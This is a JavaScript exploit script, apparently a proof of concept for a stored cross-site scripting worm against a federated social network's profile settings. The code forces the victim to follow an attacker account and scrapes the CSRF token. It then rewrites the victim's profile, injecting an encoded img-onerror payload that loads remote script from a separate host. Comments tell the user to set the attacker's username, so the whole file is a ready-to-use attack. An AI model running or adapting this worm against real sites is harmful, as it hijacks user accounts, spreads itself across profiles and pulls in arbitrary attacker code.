var req = new XMLHttpRequest();
var csrf = "";
var username = "";

// Modify bob to attackers username in your instance
var followUser = "bob";

// Follow User, no CSRF token required for follow/unfollow action, mostly another CVE
fetch("http://localhost:8888/contact/follow?url=http%3A%2F%2Flocalhost%3A8888%2Fprofile%2F" + followUser + "&auto=1",{credentials:"include"})

// Get the page to extract CSRF token
req.open('GET', "/settings/profile/", true);
req.onload  = function() {
    const regex = /<input\s+type="hidden"\s+name="form_security_token"\s+value="([^"]*)">/;
    var matches = req.responseText.split(regex);
    csrf = matches[3];
    username = req.getResponseHeader('X-Account-Management-Status').split(";")[1].split('"')[1];
    console.log(csrf);
    console.log(username);

    // Update profile of the victim
    var xssPayload = '%3Cimg+src%3Dxss+onerror%3D%22%28function%28%29%7Bvar+script%3Ddocument.createElement%28%27script%27%29%3Bscript.src%3D%27http%3A%2F%2Flocalhost%3A8886%2Fpayload.js%27%3Bdocument.head.appendChild%28script%29%3B%7D%29%28%29%22%3E';
    var req1 = new XMLHttpRequest()
    const params = 'form_security_token=' + csrf + '&username=' + username +'&about=but+most+of+all,+Devilx86+is+my+hero&dob=&address=&locality=&postal_code=&country_name=&region=' + '&homepage=' + '&xmpp=' + xssPayload + '&matrix=' +'&pub_keywords=&prv_keywords=&submit=&profile_field_order%5B%5D=new&profile_field%5Bnew%5D%5Blabel%5D=&profile_field%5Bnew%5D%5Bvalue%5D=&profile_field%5Bnew%5D%5Bvisibility%5D=public';
    req1.open('POST', "/settings/profile", true);
    req1.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    req1.send(params);
};
req.send(null)
